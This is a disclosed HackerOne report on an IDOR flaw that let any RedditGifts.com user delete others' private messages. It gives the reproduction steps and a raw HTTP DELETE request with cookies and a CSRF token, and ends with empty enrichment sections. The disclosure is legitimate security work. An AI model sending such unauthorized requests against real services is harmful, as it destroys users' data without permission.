---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1213237'
original_report_id: '1213237'
title: Deleting all DMs on RedditGifts.com
weakness: Insecure Direct Object Reference (IDOR)
team_handle: reddit
created_at: '2021-05-31T02:09:36.071Z'
disclosed_at: '2021-10-21T19:51:19.877Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 235
asset_identifier: '*.redditgifts.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# Deleting all DMs on RedditGifts.com

## Metadata

- HackerOne Report ID: 1213237
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: reddit
- Disclosed At: 2021-10-21T19:51:19.877Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
It's possible to delete all 4.4M private messages on RedditGifts.com due to missing permission check on DELETE request

## Steps To Reproduce:

  1. Set up 3 accounts on RedditGifts.com (FriendA, FriendB, Attacker)
  1. Have FriendA send message to FriendB
  1. As Attacker send the following request (with cookies):
```
DELETE /api/v1/messages/4423007/ HTTP/1.1
Host: www.redditgifts.com
X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
Referer: https://www.redditgifts.com/api/
Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
```
Change cookies/csrf token and `4423007` to your own message ID

## Supporting Material/References:

{F1320816}
{F1320817}

## Impact

It's possible to delete all 4.4M private messages on RedditGifts.com

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
